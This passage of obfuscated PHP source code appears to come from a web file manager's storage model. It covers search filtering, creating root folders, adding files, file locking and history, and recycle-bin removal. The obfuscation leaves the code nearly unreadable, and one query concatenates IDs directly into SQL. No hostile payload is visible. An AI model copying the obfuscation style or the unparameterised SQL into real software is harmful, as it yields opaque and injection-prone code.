str_replace(array($İúäÅå®[19], $İúäÅå®[63], $İúäÅå®[2122]), $İúäÅå®[12], $ÍÒ‘çŒ…); $ÍÒ‘çŒ… = $İúäÅå®[476] . str_replace($İúäÅå®[60], $İúäÅå®[477], $ÍÒ‘çŒ…); $¶ñ­±¸ = $íá«£Üë[$İúäÅå®[42]]; unset($íá«£Üë[$İúäÅå®[42]]); foreach ($íá«£Üë as $µö—¯–× => $ı¶õ¾¼) { $×¶›¥×[$İúäÅå®[476] . $µö—¯–×] = $ı¶õ¾¼; } foreach ($¶ñ­±¸ as $‚¡µº) { $×¶›¥×[] = array($İúäÅå®[481] => $‚¡µº, $İúäÅå®[1025] => $İúäÅå®[1955], array($İúäÅå®[2123] => $‚¡µº, $İúäÅå®[2124] => array($İúäÅå®[7], array($İúäÅå®[503], $İúäÅå®[502])))); } $this->join($Ûî€à¾İ); $íá«£Üë = $×¶›¥×; } private function _parseSearchWhere($úÎ¤˜´’) { $ñÒŸ¯ =& $_SERVER[ªÏ§Ë·]; $»üÎş‹ = array(); if (isset($úÎ¤˜´’[$ñÒŸ¯[788]]) && $úÎ¤˜´’[$ñÒŸ¯[788]]) { $»üÎş‹[$ñÒŸ¯[95]] = array($ñÒŸ¯[2125], $úÎ¤˜´’[$ñÒŸ¯[788]]); } if (isset($úÎ¤˜´’[$ñÒŸ¯[789]]) && $úÎ¤˜´’[$ñÒŸ¯[789]]) { $ŠÄì„âÊ = array($ñÒŸ¯[2126], $úÎ¤˜´’[$ñÒŸ¯[789]]); if ($»üÎş‹[$ñÒŸ¯[95]]) { $»üÎş‹[$ñÒŸ¯[95]] = array($»üÎş‹[$ñÒŸ¯[95]], $ŠÄì„âÊ, $ñÒŸ¯[2127]); } else { $»üÎş‹[$ñÒŸ¯[95]] = $ŠÄì„âÊ; } } if (isset($úÎ¤˜´’[$ñÒŸ¯[2119]]) && $úÎ¤˜´’[$ñÒŸ¯[2119]] > 0) { $»üÎş‹[$ñÒŸ¯[86]] = array($ñÒŸ¯[2125], $úÎ¤˜´’[$ñÒŸ¯[2119]]); } if (isset($úÎ¤˜´’[$ñÒŸ¯[2120]]) && $úÎ¤˜´’[$ñÒŸ¯[2120]]) { $ŠÄì„âÊ = array($ñÒŸ¯[2126], $úÎ¤˜´’[$ñÒŸ¯[2120]]); if ($»üÎş‹[$ñÒŸ¯[86]]) { $»üÎş‹[$ñÒŸ¯[86]] = array($»üÎş‹[$ñÒŸ¯[86]], $ŠÄì„âÊ, $ñÒŸ¯[2127]); } else { $»üÎş‹[$ñÒŸ¯[86]] = $ŠÄì„âÊ; } } if (isset($úÎ¤˜´’[$ñÒŸ¯[628]]) && $úÎ¤˜´’[$ñÒŸ¯[628]]) { $»üÎş‹[] = array($ñÒŸ¯[494] => $úÎ¤˜´’[$ñÒŸ¯[628]], $ñÒŸ¯[492] => $úÎ¤˜´’[$ñÒŸ¯[628]], $ñÒŸ¯[1025] => $ñÒŸ¯[1955]); } if (isset($úÎ¤˜´’[$ñÒŸ¯[450]]) && $úÎ¤˜´’[$ñÒŸ¯[450]]) { $¿Í±Ù“ = $úÎ¤˜´’[$ñÒŸ¯[450]]; if ($¿Í±Ù“ == $ñÒŸ¯[85]) { $»üÎş‹[$ñÒŸ¯[448]] = 1; } else { if ($¿Í±Ù“ == $ñÒŸ¯[2128]) { $»üÎş‹[$ñÒŸ¯[448]] = 0; } else { if ($¿Í±Ù“) { $¿Í±Ù“ = is_array($¿Í±Ù“) ? $¿Í±Ù“ : explode($ñÒŸ¯[60], $¿Í±Ù“); $»üÎş‹[$ñÒŸ¯[450]] = array($ñÒŸ¯[456], $¿Í±Ù“); $»üÎş‹[$ñÒŸ¯[448]] = 0; } } } } $this->_parseSearchParent($úÎ¤˜´’, $»üÎş‹); if (isset($úÎ¤˜´’[$ñÒŸ¯[1951]]) && trim($úÎ¤˜´’[$ñÒŸ¯[1951]])) { $ĞÎ»±—» = trim($úÎ¤˜´’[$ñÒŸ¯[1951]]); $üå´ö¹— = explode($ñÒŸ¯[63], $ĞÎ»±—»); if (strlen($ĞÎ»±—») > 2 && (substr($ĞÎ»±—», 0, 1) == $ñÒŸ¯[128] && substr($ĞÎ»±—», -1) == $ñÒŸ¯[128]) || substr($ĞÎ»±—», 0, 1) == $ñÒŸ¯[68] && substr($ĞÎ»±—», -1) == $ñÒŸ¯[68]) { $ĞÎ»±—» = substr($ĞÎ»±—», 1, -1); $üå´ö¹— = array($ĞÎ»±—»); } $»üÎş‹[$ñÒŸ¯[42]] = array(array($ñÒŸ¯[578], $ñÒŸ¯[1953] . $ĞÎ»±—» . $ñÒŸ¯[1953])); if (count($üå´ö¹—) > 1) { $»üÎş‹[$ñÒŸ¯[42]] = array(); foreach ($üå´ö¹— as $ˆÊœ‰ô) { if (!trim($ˆÊœ‰ô)) { continue; } $»üÎş‹[$ñÒŸ¯[42]][] = array($ñÒŸ¯[578], $ñÒŸ¯[1953] . trim($ˆÊœ‰ô) . $ñÒŸ¯[1953]); } } } return $»üÎş‹; } private function _parseSearchParent($˜Œ×±, &$¼ü°¹Ñ) { $¿›Û¹§Ş =& $_SERVER[ªÏ§Ë·]; if (!isset($˜Œ×±[$¿›Û¹§Ş[470]]) || !$˜Œ×±[$¿›Û¹§Ş[470]]) { return; } $”¼ãÁçÆ = $this->pathInfo($˜Œ×±[$¿›Û¹§Ş[470]]); $Õ§‹„˜ò = $”¼ãÁçÆ[$¿›Û¹§Ş[470]] . $¿›Û¹§Ş[12] === $¿›Û¹§Ş[208]; $­·ñ¬ş— = $”¼ãÁçÆ[$¿›Û¹§Ş[449]] == $¿›Û¹§Ş[543]; if ($”¼ãÁçÆ[$¿›Û¹§Ş[560]] == $¿›Û¹§Ş[561]) { $™ÁÌŠÀ = $this->sourceInfo($˜Œ×±[$¿›Û¹§Ş[470]]); $”¼ãÁçÆ[$¿›Û¹§Ş[549]] = $™ÁÌŠÀ[$¿›Û¹§Ş[549]]; } $¼ü°¹Ñ[$¿›Û¹§Ş[618]] = array($¿›Û¹§Ş[578], $”¼ãÁçÆ[$¿›Û¹§Ş[549]] . $˜Œ×±[$¿›Û¹§Ş[470]] . $¿›Û¹§Ş[579]); $éüÄèØÚ = isset($˜Œ×±[$¿›Û¹§Ş[1816]]) && in_array($¿›Û¹§Ş[543], $˜Œ×±[$¿›Û¹§Ş[1816]]); if (!$éüÄèØÚ || !$­·ñ¬ş— || !$Õ§‹„˜ò || !$”¼ãÁçÆ[$¿›Û¹§Ş[451]]) { return; } if (!AuthModel::authCheckRoot($”¼ãÁçÆ[$¿›Û¹§Ş[451]][$¿›Û¹§Ş[452]])) { return; } $¶Õ¢ÈÎû = $”¼ãÁçÆ[$¿›Û¹§Ş[534]] . $¿›Û¹§Ş[12]; if ($¶Õ¢ÈÎû == $¿›Û¹§Ş[98]) { unset($¼ü°¹Ñ[$¿›Û¹§Ş[618]]); $¼ü°¹Ñ[$¿›Û¹§Ş[449]] = self::TYPE_GROUP; return; } $›Ä‹åŒô = Model($¿›Û¹§Ş[550])->groupChildrenAll($¶Õ¢ÈÎû); $ÌÄÊ¿ô = count($›Ä‹åŒô); if ($ÌÄÊ¿ô <= 1) { return; } $ï–‘ùˆè = array($¿›Û¹§Ş[470] => 0, $¿›Û¹§Ş[449] => self::TYPE_GROUP, $¿›Û¹§Ş[534] => array($¿›Û¹§Ş[7], $›Ä‹åŒô)); $¿È×÷ˆ« = $this->field($¿›Û¹§Ş[2129])->where($ï–‘ùˆè)->limit($ÌÄÊ¿ô)->select(); $¼ü°¹Ñ[$¿›Û¹§Ş[618]] = array(); foreach ($¿È×÷ˆ« as $ëâÄÚøî) { $¼ü°¹Ñ[$¿›Û¹§Ş[618]][] = array($¿›Û¹§Ş[578], $¿›Û¹§Ş[559] . $ëâÄÚøî[$¿›Û¹§Ş[440]] . $¿›Û¹§Ş[579]); } $¼ü°¹Ñ[$¿›Û¹§Ş[618]][] = $¿›Û¹§Ş[1955]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($–óãïŠ) { $ù˜Ùãß» =& $_SERVER[ªÏ§Ë·]; $§ê©äè× = Model($ù˜Ùãß»[542])->where(array($ù˜Ùãß»[1658] => $–óãïŠ))->find(); $ö•¡‚İ = $this->_mkdirRoot(SourceModel::TYPE_USER, $–óãïŠ, $§ê©äè×[$ù˜Ùãß»[42]]); $this->userDesktopAdd($ö•¡‚İ); return $ö•¡‚İ; } public function userDesktopAdd($ğ©÷ûÓ®) { $¼…Á–íö =& $_SERVER[ªÏ§Ë·]; $Š²ÁØÛô = LNG($¼…Á–íö[2130]); $âÇöáé« = $this->mkdir($ğ©÷ûÓ®, $Š²ÁØÛô); $this->metaSet($âÇöáé«, $¼…Á–íö[2131], $¼…Á–íö[98]); $this->metaSet($ğ©÷ûÓ®, $¼…Á–íö[2132], $âÇöáé«); } public function userPathSafeAdd($‘ˆ™åÜ›) { $ã¸‰ìã =& $_SERVER[ªÏ§Ë·]; $İ±±õçĞ = Model($ã¸‰ìã[542])->getInfoFull($‘ˆ™åÜ›); if (!$İ±±õçĞ) { return !1; } if (_get($İ±±õçĞ, $ã¸‰ìã[564])) { return $İ±±õçĞ[$ã¸‰ìã[504]][$ã¸‰ìã[2133]]; } $–äŠ×³Ë = $this->_mkdirRoot(SourceModel::TYPE_USER, $‘ˆ™åÜ›, $ã¸‰ìã[2134], $ã¸‰ìã[471]); Model($ã¸‰ìã[542])->metaSet($‘ˆ™åÜ›, $ã¸‰ìã[2133], $–äŠ×³Ë); $this->metaSet($–äŠ×³Ë, $ã¸‰ìã[2135], $‘ˆ™åÜ›); return $–äŠ×³Ë; } public function groupRootAdd($¬„ğ„¬Â) { $Ã›Ó¢ó =& $_SERVER[ªÏ§Ë·]; $…¥ºÄõĞ = Model($Ã›Ó¢ó[550])->where(array($Ã›Ó¢ó[1945] => $¬„ğ„¬Â))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¬„ğ„¬Â, $…¥ºÄõĞ[$Ã›Ó¢ó[42]]); } public function systemRootPathAdd($´ Ëç„©) { if ($´ Ëç„© != $_SERVER[ªÏ§Ë·][572]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $´ Ëç„©); } public function userRootRemove($´éÈ†Î) { $İá³¨“í = $this->targetSourceRoot(SourceModel::TYPE_USER, $´éÈ†Î, !0); foreach ($İá³¨“í as $ı¾Ú»üÅ) { if (!$ı¾Ú»üÅ) { continue; } $this->remove($ı¾Ú»üÅ[$_SERVER[ªÏ§Ë·][440]], !1); } } public function groupRootRemove($Óœ°±éô) { $€ç”äÅ„ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Óœ°±éô); if (!$€ç”äÅ„) { return; } $this->remove($€ç”äÅ„[$_SERVER[ªÏ§Ë·][440]], !1); } private function _mkdirRoot($š¬ŸÍš, $ñÜ Ø, $óë®, $å“ıå” = '') { $²¡Èİüœ =& $_SERVER[ªÏ§Ë·]; $Æèëƒ›Ÿ = defined($²¡Èİüœ[2078]) ? USER_ID : 0; $£ÕÑŠİë = array($²¡Èİüœ[439] => 0, $²¡Èİüœ[614] => $š¬ŸÍš, $²¡Èİüœ[615] => $ñÜ Ø, $²¡Èİüœ[612] => 1, $²¡Èİüœ[616] => $Æèëƒ›Ÿ, $²¡Èİüœ[617] => $Æèëƒ›Ÿ, $²¡Èİüœ[613] => $å“ıå”, $²¡Èİüœ[618] => $²¡Èİüœ[559], $²¡Èİüœ[468] => 0, $²¡Èİüœ[583] => 0, $²¡Èİüœ[507] => 0, $²¡Èİüœ[619] => $²¡Èİüœ[12]); if ($çâûœÀÏ = $this->where($£ÕÑŠİë)->find()) { return $çâûœÀÏ[$²¡Èİüœ[440]]; } $ºš·ƒÜÂ = "\x4d\x6f\x64\145\154\123\x6f\165\x72\x63\145\x2e\x6d\153\144\151\x72\122\157\x6f\x74\56{$š¬ŸÍš}\56{$ñÜ Ø}\56" . $óë®; CacheLock::lock($ºš·ƒÜÂ); $£ÕÑŠİë[$²¡Èİüœ[42]] = $óë®; $ã¤‘¬Ù³ = $this->add($£ÕÑŠİë); $òÛÙ„ŒŠ = array($²¡Èİüœ[620] => short_id($ã¤‘¬Ù³)); $this->where(array($²¡Èİüœ[455] => $ã¤‘¬Ù³))->save($òÛÙ„ŒŠ); CacheLock::unlock($ºš·ƒÜÂ); return $ã¤‘¬Ù³; } private function targetSourceRoot($çœñÏğ, $ÁŒŠŠß, $„â¦úÚÏ = false) { $‘€ÉËÅ‡ =& $_SERVER[ªÏ§Ë·]; $„¦ŒˆÆ± = array($‘€ÉËÅ‡[439] => 0, $‘€ÉËÅ‡[614] => $çœñÏğ, $‘€ÉËÅ‡[615] => $ÁŒŠŠß); if ($„â¦úÚÏ) { $Á°ÃÔÒ = $this->where($„¦ŒˆÆ±)->select(); return $Á°ÃÔÒ ? $Á°ÃÔÒ : array(); } $³¶„’÷ú = $this->where($„¦ŒˆÆ±)->find(); return $³¶„’÷ú ? $³¶„’÷ú : array(); } public function sourceRootGroup($¥©ªÛµº) { $“ÖÙŞ =& $_SERVER[ªÏ§Ë·]; if (is_string($¥©ªÛµº)) { $¥©ªÛµº = array($¥©ªÛµº); } $›õÖãÇ‡ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¥©ªÛµº, $“ÖÙŞ[199]); $íĞ‹¬Ü = array($“ÖÙŞ[407] => $›õÖãÇ‡, $“ÖÙŞ[404] => array($“ÖÙŞ[786] => count($¥©ªÛµº))); $this->_listDataApply($íĞ‹¬Ü[$“ÖÙŞ[407]]); $this->_listMake($íĞ‹¬Ü); return array_to_keyvalue($íĞ‹¬Ü[$“ÖÙŞ[92]], $“ÖÙŞ[534]); } public function mkfile($Î—Ø•¢ã, $‡‘ö´Éí, $¾óó— = '', $«‹Ï ÙÉ = REPEAT_RENAME) { $É¹°²Ò… =& $_SERVER[ªÏ§Ë·]; $¹å¤ãÆ = Model($É¹°²Ò…[639])->addFileByContent($¾óó—, $‡‘ö´Éí); return $this->_createFileCall($Î—Ø•¢ã, $‡‘ö´Éí, $¹å¤ãÆ, $«‹Ï ÙÉ, $É¹°²Ò…[1369]); } public function addFile($¢¢Ğ¢Ê, $š”ŞìÌ, $®±¿¼Æı, $­æ«´µã = false, $îÌĞû‘İ = REPEAT_RENAME) { $Êî¥ĞŠ = Model($_SERVER[ªÏ§Ë·][639])->addFile($š”ŞìÌ, $®±¿¼Æı, $­æ«´µã); return $this->_createFileCall($¢¢Ğ¢Ê, $®±¿¼Æı, $Êî¥ĞŠ, $îÌĞû‘İ); } public function addFileByFileID($Åá¶á¦š, $¤‘›òĞ«, $€Ñ¾ÇÔ, $é•£Æù“ = REPEAT_RENAME) { $²•Ñéú =& $_SERVER[ªÏ§Ë·]; $¢¥‚õµ = Model($²•Ñéú[639])->find($¤‘›òĞ«); Model($²•Ñéú[639])->linkAdd($¤‘›òĞ«); return $this->_createFileCall($Åá¶á¦š, $€Ñ¾ÇÔ, $¢¥‚õµ, $é•£Æù“); } public function addFileByRemote($‚úùòÊİ, $Ğô¿°ØÕ, $ğÙ”°Òê, $©ÇôÆîï = array(), $øƒ¢È = REPEAT_RENAME) { $Ä·éÓÍ = Model($_SERVER[ªÏ§Ë·][639])->addFileByRemote($Ğô¿°ØÕ, $ğÙ”°Òê, $©ÇôÆîï); return $this->_createFileCall($‚úùòÊİ, $ğÙ”°Òê, $Ä·éÓÍ, $øƒ¢È); } private function _createFileCall($’êã¡ñµ, $´³Ã”‘À, $Í“˜Á, $Èçùè‘”, $õüÌå = "\x75\x70\x6c\157\141\x64") { $¬İ¹ˆ€Œ =& $_SERVER[ªÏ§Ë·]; $äôÂó” = !1; $this->setMasterDB(); $this->lockWriteStart($’êã¡ñµ, $´³Ã”‘À); $­Ÿş­âå = $this->fileNameExist($’êã¡ñµ, $´³Ã”‘À); $‚µ´ó†¡ = $this->_createFile($’êã¡ñµ, $´³Ã”‘À, $Í“˜Á, $Èçùè‘”, $äôÂó”); if (!$äôÂó”) { Model($¬İ¹ˆ€Œ[509])->remove($Í“˜Á[$¬İ¹ˆ€Œ[506]]); } if ($äôÂó” && $‚µ´ó†¡ && $‚µ´ó†¡ != $­Ÿş­âå) { Model($¬İ¹ˆ€Œ[2103])->eventCreate($‚µ´ó†¡, $õüÌå); } $this->lockWriteEnd($’êã¡ñµ, $´³Ã”‘À); return $‚µ´ó†¡; } public function mkdir($å“Šİ‹Ò, $şÆãŞ´Õ, $üìÈÜÎß = REPEAT_SKIP) { $ì¹×¨² =& $_SERVER[ªÏ§Ë·]; $this->setMasterDB(); $ƒ¥Û‰äô = $this->sourceInfo($å“Šİ‹Ò); if (!$ƒ¥Û‰äô) { return !1; } $this->lockWriteStart($å“Šİ‹Ò, $şÆãŞ´Õ); if ($üìÈÜÎß !== !1) { $Ë‘ÌÓ“ã = $this->fileNameExist($å“Šİ‹Ò, $şÆãŞ´Õ); if ($Ë‘ÌÓ“ã && $üìÈÜÎß != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($å“Šİ‹Ò, $şÆãŞ´Õ); return $Ë‘ÌÓ“ã; } $şÆãŞ´Õ = $this->fileNameAuto($å“Šİ‹Ò, $şÆãŞ´Õ, $üìÈÜÎß); } $‹·åºŸ¹ = array($ì¹×¨²[612] => 1, $ì¹×¨²[458] => $şÆãŞ´Õ, $ì¹×¨²[613] => $ì¹×¨²[12], $ì¹×¨²[507] => 0, $ì¹×¨²[583] => 0); $÷“°ÜöÈ = $this->_addSource($‹·åºŸ¹, $ƒ¥Û‰äô); Model($ì¹×¨²[2103])->eventCreate($÷“°ÜöÈ, $ì¹×¨²[1370]); $this->lockWriteEnd($å“Šİ‹Ò, $şÆãŞ´Õ); return $÷“°ÜöÈ; } public function listSourceRoot($ŒËÇÀ¡ß, $¢Õ³©äË, $÷ ³Ä¿Š = "\163\157\x75\x72\143\x65\111\104\x2c\x74\x61\162\x67\145\164\111\x44\x2c\x73\x69\172\145") { $İË€í£ =& $_SERVER[ªÏ§Ë·]; $ø¾­äéø = $İË€í£[416]; $Á®æ£Œü = array(); $°Îš²¼ù = 1024 * 50; $âÔš”éß = is_array($âÔš”éß) ? $âÔš”éß : array(); $†ÁÇ’¦ç = count($¢Õ³©äË); $›à‹Öˆó = $this->tablePrefix . $İË€í£[2136]; for ($€©Â½úÁ = 0; $€©Â½úÁ < $†ÁÇ’¦ç; $€©Â½úÁ++) { $ÃÂ°§³ö = $¢Õ³©äË[$€©Â½úÁ]; $ø¾­äéø .= "\123\105\x4c\105\103\124\x20\52\40\106\122\117\x4d\40\50\x53\x45\114\105\x43\x54\x20{$÷ ³Ä¿Š}\40\x46\x52\x4f\x4d\40\140{$›à‹Öˆó}\140\40\127\x48\105\x52\x45\x20"; $ø¾­äéø .= "\140\x70\x61\162\x65\x6e\x74\111\x44\140\x3d\x30\x20\101\116\x44\x20\140\x74\x61\x72\x67\x65\164\x49\104\x60\x3d{$ÃÂ°§³ö}\x20\x41\x4e\104\40\x60\x74\x61\x72\x67\145\164\124\171\160\x65\140\75{$ŒËÇÀ¡ß}\40\x61\156\x64\x20\146\151\x6c\145\x54\171\160\x65\x3d\x27\47\x20\154\x69\155\x69\x74\40\61\x29\x20\141\163\40\164\142\137{$€©Â½úÁ}\x20\125\116\x49\117\116\x20\x41\114\x4c\40"; if ((strlen($ø¾­äéø) >= $°Îš²¼ù || $€©Â½úÁ == $†ÁÇ’¦ç - 1) && $ø¾­äéø) { $ø¾­äéø = substr($ø¾­äéø, 0, -strlen($İË€í£[1063])); $…ªø†£ = $this->query($ø¾­äéø); $ø¾­äéø = $İË€í£[12]; $Á®æ£Œü = array_merge($Á®æ£Œü, $…ªø†£); } } return $Á®æ£Œü; } private function _createFile($ÛÂİú, $íı¯¨È¹, $½Àğğ¨Ö, $‘üˆÕáé, &$Ü¸ë¤Ùš) { $Í¹±ĞÛ¢ =& $_SERVER[ªÏ§Ë·]; $ƒ¯äÔˆ³ = $this->sourceInfo($ÛÂİú); if (!$½Àğğ¨Ö || !$ƒ¯äÔˆ³) { return !1; } if ($‘üˆÕáé !== !1) { $Ü¤»’÷Ğ = $this->fileNameExist($ÛÂİú, $íı¯¨È¹); } $Ü¸ë¤Ùš = !0; if ($‘üˆÕáé && $Ü¤»’÷Ğ) { if ($‘üˆÕáé == REPEAT_SKIP) { $Ü¸ë¤Ùš = !1; return $Ü¤»’÷Ğ; } else { if ($‘üˆÕáé == REPEAT_REPLACE) { $Ğñ«Ì’ = $this->sourceInfo($Ü¤»’÷Ğ); $è¯±ÓäÏ = $this->fileHistory($Ğñ«Ì’, $½Àğğ¨Ö[$Í¹±ĞÛ¢[506]], $½Àğğ¨Ö[$Í¹±ĞÛ¢[86]]); if (!$è¯±ÓäÏ) { $Ü¸ë¤Ùš = !1; } else { $this->folderSizeReset($ÛÂİú); } return $Ü¤»’÷Ğ; } else { $íı¯¨È¹ = $this->fileNameAuto($ÛÂİú, $íı¯¨È¹, $‘üˆÕáé, !1); } } } $Ÿ–ÂÃ‚ë = array($Í¹±ĞÛ¢[612] => 0, $Í¹±ĞÛ¢[458] => $íı¯¨È¹, $Í¹±ĞÛ¢[613] => substr(get_path_ext($íı¯¨È¹), 0, 10), $Í¹±ĞÛ¢[507] => $½Àğğ¨Ö[$Í¹±ĞÛ¢[506]], $Í¹±ĞÛ¢[583] => $½Àğğ¨Ö[$Í¹±ĞÛ¢[86]]); $€¢—Ã­É = $this->_addSource($Ÿ–ÂÃ‚ë, $ƒ¯äÔˆ³); $this->folderSizeReset($ÛÂİú, intval($Ÿ–ÂÃ‚ë[$Í¹±ĞÛ¢[86]])); return $€¢—Ã­É; } protected function fileHistory($âëŞ¹ÀĞ, $™ùÙ‘Ö, $ºâ‡í”ã) { $²Ì‹é„ =& $_SERVER[ªÏ§Ë·]; if ($âëŞ¹ÀĞ[$²Ì‹é„[506]] == $™ùÙ‘Ö) { return !1; } $this->checkLock($âëŞ¹ÀĞ[$²Ì‹é„[440]], $™ùÙ‘Ö); Model($²Ì‹é„[2137])->addHistory($âëŞ¹ÀĞ); $’Ûû„†Õ = array($²Ì‹é„[617] => USER_ID, $²Ì‹é„[462] => time(), $²Ì‹é„[506] => $™ùÙ‘Ö, $²Ì‹é„[86] => $ºâ‡í”ã); $this->where(array($²Ì‹é„[455] => $âëŞ¹ÀĞ[$²Ì‹é„[440]]))->save($’Ûû„†Õ); $this->sourceCacheClear($âëŞ¹ÀĞ[$²Ì‹é„[440]]); return !0; } public function checkLock($ÒãÑû¾¿, $éãŒ‡Øñ) { $îÜÕŸ¥ =& $_SERVER[ªÏ§Ë·]; $ØßÆ¡â = $this->pathInfo($ÒãÑû¾¿); if (!$this->fileIsLock($ØßÆ¡â, !0)) { return; } $¾’«ğó· = Session::get($îÜÕŸ¥[2138]); $ì™¿ªèÓ = substr($ØßÆ¡â[$îÜÕŸ¥[42]], 0, -1 - strlen($ØßÆ¡â[$îÜÕŸ¥[184]])) . $îÜÕŸ¥[1233] . $¾’«ğó· . $îÜÕŸ¥[10] . $ØßÆ¡â[$îÜÕŸ¥[184]]; $úß×Õ­£ = Model($îÜÕŸ¥[639])->find($éãŒ‡Øñ); $this->_createFileCall($ØßÆ¡â[$îÜÕŸ¥[470]], $ì™¿ªèÓ, $úß×Õ­£, REPEAT_REPLACE, $îÜÕŸ¥[1369]); $¬¡‰±Ó» = $ØßÆ¡â[$îÜÕŸ¥[504]][$îÜÕŸ¥[576]]; $ÀÄşæú = $¬¡‰±Ó»[$îÜÕŸ¥[570]] ? $¬¡‰±Ó»[$îÜÕŸ¥[570]] : $¬¡‰±Ó»[$îÜÕŸ¥[42]]; show_json(LNG($îÜÕŸ¥[2139]) . $îÜÕŸ¥[2140] . LNG($îÜÕŸ¥[2141]) . $îÜÕŸ¥[2142] . $ÀÄşæú . $îÜÕŸ¥[2143], !1); } public function fileIsLock($ùéíâŒØ, $ÙæãÜ·× = false) { $×ù‹¡š =& $_SERVER[ªÏ§Ë·]; if (!isset($ùéíâŒØ[$×ù‹¡š[504]]) || !$ùéíâŒØ[$×ù‹¡š[504]][$×ù‹¡š[573]]) { return !1; } if ($ùéíâŒØ[$×ù‹¡š[504]][$×ù‹¡š[573]] != USER_ID) { return !0; } $œËµ± = $GLOBALS[$×ù‹¡š[6]][$×ù‹¡š[99]][$×ù‹¡š[574]]; if ($ùéíâŒØ[$×ù‹¡š[504]][$×ù‹¡š[575]] <= time() - $œËµ±) { $this->metaSet($ùéíâŒØ[$×ù‹¡š[440]], $×ù‹¡š[573], null); $this->metaSet($ùéíâŒØ[$×ù‹¡š[440]], $×ù‹¡š[575], null); } if ($ÙæãÜ·×) { $this->metaSet($ùéíâŒØ[$×ù‹¡š[440]], $×ù‹¡š[575], time()); } return !1; } private function _addSource($Ã„ç°Ú, $ğ´ã®µ) { $µ·ó› =& $_SERVER[ªÏ§Ë·]; $ĞƒÖì‚— = defined($µ·ó›[2078]) ? USER_ID : 0; $ìãÍªÃå = array($µ·ó›[614] => $ğ´ã®µ[$µ·ó›[449]], $µ·ó›[615] => $ğ´ã®µ[$µ·ó›[534]], $µ·ó›[616] => $ĞƒÖì‚—, $µ·ó›[617] => $ĞƒÖì‚—, $µ·ó›[439] => $ğ´ã®µ[$µ·ó›[440]], $µ·ó›[618] => $ğ´ã®µ[$µ·ó›[549]] . $ğ´ã®µ[$µ·ó›[440]] . $µ·ó›[60], $µ·ó›[468] => 0, $µ·ó›[619] => $µ·ó›[12]); $Ã„ç°Ú = array_merge($ìãÍªÃå, $Ã„ç°Ú); $this->updateModifyTime($Ã„ç°Ú[$µ·ó›[470]]); $Ø¸¯™„Š = $µ·ó›[2144] . $ğ´ã®µ[$µ·ó›[440]]; if (isset(self::$cacheChildList[$Ø¸¯™„Š])) { unset(self::$cacheChildList[$Ø¸¯™„Š]); } static $Èé°ù¡ = false; if (!$Èé°ù¡) { Hook::trigger($µ·ó›[602], $Ã„ç°Ú); $Èé°ù¡ = !0; } $‡»ŸƒìÑ = $this->add($Ã„ç°Ú); $ÛÈ‘×‹Š = array($µ·ó›[620] => short_id($‡»ŸƒìÑ)); $this->where(array($µ·ó›[455] => $‡»ŸƒìÑ))->save($ÛÈ‘×‹Š); $this->setNamePinyin($‡»ŸƒìÑ, $Ã„ç°Ú[$µ·ó›[42]]); return $‡»ŸƒìÑ; } public function remove($à¢Ë¨ÍÄ, $›“ºíÜö = true) { $³‡ş’À£ =& $_SERVER[ªÏ§Ë·]; $ºŞ¬Ïè¡ = $this->sourceInfo($à¢Ë¨ÍÄ); $Ô™ÆÅ”ä = intval($ºŞ¬Ïè¡[$³‡ş’À£[449]]) === self::TYPE_SYSTEM; $¾­ÚëËô = Model($³‡ş’À£[473])->get($³‡ş’À£[2145]) == $³‡ş’À£[98]; if ($Ô™ÆÅ”ä || $›“ºíÜö || !$¾­ÚëËô) { return $this->removeNow($à¢Ë¨ÍÄ, $›“ºíÜö); } $ñ–¶´–ú = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‘¸×˜‹ö = $ºŞ¬Ïè¡[$³‡ş’À£[449]] == self::TYPE_USER ? $³‡ş’À£[628] : $³‡ş’À£[543]; if ($‘¸×˜‹ö == $³‡ş’À£[628]) { $¯åòË = Model($³‡ş’À£[542])->getInfo($ºŞ¬Ïè¡[$³‡ş’À£[534]]); $ˆááÆ = !empty($¯åòË[$³‡ş’À£[570]]) ? $¯åòË[$³‡ş’À£[570]] : $¯åòË[$³‡ş’À£[42]]; $ˆááÆ = $³‡ş’À£[298] . $ˆááÆ . $³‡ş’À£[2146] . $ºŞ¬Ïè¡[$³‡ş’À£[534]]; } else { $¯åòË = Model($³‡ş’À£[550])->getInfo($ºŞ¬Ïè¡[$³‡ş’À£[534]]); $ˆááÆ = _get($¯åòË, $³‡ş’À£[42]); $ˆááÆ = $³‡ş’À£[172] . $ˆááÆ . $³‡ş’À£[2147] . $ºŞ¬Ïè¡[$³‡ş’À£[534]]; } $” ú„­ì = $³‡ş’À£[2148] . md5($ˆááÆ); CacheLock::lock($” ú„­ì); $â—É‚äô = $this->fileNameExist($ñ–¶´–ú, $ˆááÆ); if (!$â—É‚äô) { $â—É‚äô = $this->mkdir($ñ–¶´–ú, $ˆááÆ, REPEAT_SKIP); $this->metaSet($â—É‚äô, $³‡ş’À£[2149], $‘¸×˜‹ö); $this->metaSet($â—É‚äô, $³‡ş’À£[2150], $ºŞ¬Ïè¡[$³‡ş’À£[534]]); if ($ºŞ¬Ïè¡[$³‡ş’À£[470]] != 0) { $this->metaSet($â—É‚äô, $³‡ş’À£[2151], _get($¯åòË, $³‡ş’À£[2152])); } } CacheLock::unlock($” ú„­ì); $this->metaSet($à¢Ë¨ÍÄ, $³‡ş’À£[2153], $ºŞ¬Ïè¡[$³‡ş’À£[470]]); $this->where(array($³‡ş’À£[440] => $à¢Ë¨ÍÄ))->save(array($³‡ş’À£[462] => time())); $this->recycleClear($ºŞ¬Ïè¡); $¤®ç‚£Š = $this->move($à¢Ë¨ÍÄ, $â—É‚äô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ºŞ¬Ïè¡[$³‡ş’À£[470]]); return $¤®ç‚£Š; } private function recycleClear($€í¡Œ³Ø) { $æ˜à½ôï =& $_SERVER[ªÏ§Ë·]; $—ŞŠ§ç´ = $this->childrenAll($€í¡Œ³Ø); $µåÑ²‘Ò = array($æ˜à½ôï[455] => array($æ˜à½ôï[456], $—ŞŠ§ç´[$æ˜à½ôï[2154]])); Model($æ˜à½ôï[2155])->where($µåÑ²‘Ò)->delete(); } public function removeNow($çé´½„˜, $‰¹¸íô¢ = true) { $’üœóØ =& $_SERVER[ªÏ§Ë·]; if 